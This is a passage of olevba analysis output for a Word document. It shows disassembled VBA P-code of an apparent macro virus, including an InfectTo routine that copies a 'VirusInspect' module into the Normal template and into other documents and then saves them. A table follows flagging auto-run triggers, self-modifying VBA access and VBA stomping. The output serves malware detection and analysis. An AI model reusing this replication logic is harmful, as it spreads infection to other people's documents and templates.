' 	ArgsCall MsgBox 0x0001 
' Line #283:
' Line #284:
' 	EndSub 
' Line #285:
' Line #286:
' Line #287:
' 	FuncDefn (Function GetVer(prj As Variant) As Double)
' Line #288:
' 	QuoteRem 0x0000 0x001E "Dim pprj As Variant 'VBProject"
' Line #289:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0015 0x000B "VBComponent"
' Line #290:
' 	Dim 
' 	VarDefn VerStr (As String)
' Line #291:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #292:
' 	Dim (Const) 
' 	LitStr 0x0007 "Version"
' 	VarDefn Tag (As String)
' Line #293:
' 	LitR8 0x0000 0x0000 0x0000 0x0000 
' 	St GetVer 
' Line #294:
' 	SetStmt 
' 	LitNothing 
' 	Set g_VBCom 
' Line #295:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld prj 
' 	MemLd VBComponents 
' 	ForEach 
' Line #296:
' 	Ld Logo 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #297:
' 	SetStmt 
' 	Ld VBCom 
' 	Set g_VBCom 
' Line #298:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	St GetVer 
' Line #299:
' 	OnError NoVer 
' Line #300:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St VerStr 
' Line #301:
' 	LitDI2 0x0001 
' 	Ld VerStr 
' 	Ld Tag 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	St i 
' Line #302:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #303:
' 	Ld VerStr 
' 	Ld VerStr 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	Ld Tag 
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St GetVer 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	Label NoVer 
' Line #306:
' 	ExitFunc 
' Line #307:
' 	EndIfBlock 
' Line #308:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	NextVar 
' Line #309:
' 	EndFunc 
' Line #310:
' 	FuncDefn (Function GetLatest() As Variant)
' Line #311:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #312:
' 	Dim 
' 	VarDefn Ver (As Double)
' Line #313:
' 	SetStmt 
' 	LitNothing 
' 	Set GetLatest 
' Line #314:
' 	LitDI2 0x0000 
' 	St LatestVer 
' Line #315:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ForEach 
' Line #316:
' 	Ld prj 
' 	ArgsLd GetVer 0x0001 
' 	St Ver 
' Line #317:
' 	Ld Ver 
' 	Ld LatestVer 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #318:
' 	Ld Ver 
' 	St LatestVer 
' Line #319:
' 	SetStmt 
' 	Ld g_VBCom 
' 	Set GetLatest 
' Line #320:
' 	EndIfBlock 
' Line #321:
' 	StartForVariable 
' 	Ld prj 
' 	EndForVariable 
' 	NextVar 
' Line #322:
' 	EndFunc 
' Line #323:
' 	FuncDefn (Sub setup())
' Line #324:
' 	Ld ThisDocument 
' 	MemLd Application 
' 	MemLd NormalTemplate 
' 	ArgsCall (Call) InfectTo 0x0001 
' Line #325:
' 	LitStr 0x000A "Installed "
' 	Ld Logo 
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #326:
' Line #327:
' 	EndSub 
' Line #328:
' Line #329:
' 	FuncDefn (Function FoundMod(doc As Variant, ByVal s As String) As Variant)
' Line #330:
' 	Dim 
' 	VarDefn VBCom (As Variant)
' 	QuoteRem 0x0016 0x000B "VBComponent"
' Line #331:
' 	StartForVariable 
' 	Ld VBCom 
' 	EndForVariable 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #332:
' 	Ld VBCom 
' 	MemLd New 
' 	Ld s 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #333:
' 	SetStmt 
' 	Ld VBCom 
' 	Set FoundMod 
' Line #334:
' 	ExitFunc 
' Line #335:
' 	EndIfBlock 
' Line #336:
' 	StartForVariable 
' 	Next 
' Line #337:
' 	SetStmt 
' 	LitNothing 
' 	Set FoundMod 
' Line #338:
' 	EndFunc 
' Line #339:
' Line #340:
' 	FuncDefn (Sub InfectTo(doc As Variant))
' Line #341:
' 	Dim 
' 	VarDefn prj (As Variant)
' 	QuoteRem 0x0013 0x0009 "VBProject"
' Line #342:
' 	Dim 
' 	VarDefn VBCom
' 	VarDefn ObjCom (As Variant)
' 	QuoteRem 0x001D 0x000B "VBComponent"
' Line #343:
' 	Dim 
' 	VarDefn r (As Double)
' Line #344:
' 	Dim 
' 	VarDefn saved (As Boolean)
' Line #345:
' Line #346:
' Line #347:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusInspect"
' 	VarDefn modname (As String)
' Line #348:
' Line #349:
' 	Ld doc 
' 	MemLd saved 
' 	St saved 
' Line #350:
' 	SetStmt 
' 	Ld GetLatest 
' 	Set VBCom 
' Line #351:
' 	Ld doc 
' 	MemLd VBProject 
' 	ArgsLd GetVer 0x0001 
' 	St r 
' Line #352:
' 	Ld r 
' 	Paren 
' 	SelectCase 
' Line #353:
' 	Ld LatestVer 
' 	CaseGe 
' 	CaseDone 
' 	BoS 0x0000 
' 	ExitSub 
' Line #354:
' 	CaseElse 
' Line #355:
' 	Ld r 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #356:
' 	LitStr 0x000A "Upgraded！"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #357:
' 	ElseBlock 
' Line #358:
' 	LitStr 0x000B "Installed！"
' 	Ld Logo 
' 	Concat 
' 	ArgsCall (Call) ShowStatus 0x0001 
' Line #359:
' 	EndIfBlock 
' Line #360:
' 	ArgsCall Beep 0x0000 
' Line #361:
' 	ArgsCall Beep 0x0000 
' Line #362:
' 	ArgsCall Beep 0x0000 
' Line #363:
' Line #364:
' 	EndSelect 
' Line #365:
' Line #366:
' 	SetStmt 
' 	Ld doc 
' 	Ld modname 
' 	ArgsLd FoundMod 0x0002 
' 	Set ObjCom 
' Line #367:
' 	Ld ObjCom 
' 	LitNothing 
' 	Is 
' 	Paren 
' 	IfBlock 
' Line #368:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set ObjCom 
' 	QuoteRem 0x0037 0x0015 "vbext_ct_StdModule  )"
' Line #369:
' 	Ld modname 
' 	Ld ObjCom 
' 	MemSt New 
' Line #370:
' 	EndIfBlock 
' Line #371:
' 	LitDI2 0x0001 
' 	Ld ObjCom 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	Ld ObjCom 
' 	MemLd codemodule 
' 	ArgsMemCall (Call) deletelines 0x0002 
' Line #372:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBCom 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld VBCom 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ObjCom 
' 	MemLd codemodule 
' 	ArgsMemCall (Call) InsertLines 0x0002 
' Line #373:
' 	Ld saved 
' 	Paren 
' 	IfBlock 
' Line #374:
' 	OnError (Resume Next) 
' Line #375:
' 	Ld doc 
' 	MemLd FullName 
' 	Ld doc 
' 	ArgsMemCall (Call) SaveAs 0x0001 
' Line #376:
' 	EndIfBlock 
' Line #377:
' Line #378:
' 	EndSub 
' Line #379:
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' Line #400:
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' Line #407:
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' Line #442:
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' Line #448:
' Line #449:
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' Line #455:
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' Line #469:
' Line #470:
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' Line #484:
' Line #485:
' Line #486:
' Line #487:
' Line #488:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

